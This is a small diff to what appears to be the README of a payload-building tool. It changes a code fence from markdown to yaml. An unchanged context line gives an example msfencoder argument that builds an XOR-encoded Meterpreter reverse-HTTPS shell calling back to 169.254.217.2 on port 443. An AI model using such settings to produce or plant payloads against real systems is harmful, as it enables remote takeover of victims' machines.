@@ -80,9 +80,7 @@ Once you are able to connect to VMs, you need to specify the variables in `group
 
 variable you need to change are `msfencoder` arguments and `compiler`.
 
-```md
----
-
+```yaml
 # Linux
 ## MsfEncode arguments
 ## msfencoder 169.254.217.2 443 cs xor 0xfa windows/meterpreter/reverse_https
